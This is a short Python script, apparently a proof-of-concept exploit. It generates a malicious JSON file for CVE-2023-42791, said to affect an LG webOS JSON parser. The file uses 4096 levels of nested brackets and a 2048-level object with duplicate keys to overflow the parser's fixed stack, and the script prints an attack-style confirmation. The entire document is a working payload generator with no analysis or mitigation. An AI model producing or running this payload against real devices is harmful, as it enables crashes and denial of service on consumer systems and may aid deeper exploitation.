#!/usr/bin/env python3
"""CVE-2023-42791 — LG webOS mrcJSON. Deeply nested / duplicate-key JSON that
overflows the parser's fixed stack."""
import sys
from pathlib import Path

def build() -> bytes:
    depth = 4096
    nested = b"[" * depth + b"1" + b"]" * depth
    dupkeys = b'{"a":1,' * 2048 + b'"z":0' + b"}" * 2048
    return b'{"deep":' + nested + b',"dup":' + dupkeys + b"}"

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2023-42791.json")
    d = build(); out.write_bytes(d)
    print(f"[+] CVE-2023-42791 mrcJSON payload -> {out} ({len(d)} bytes)")

if __name__ == "__main__":
    main()
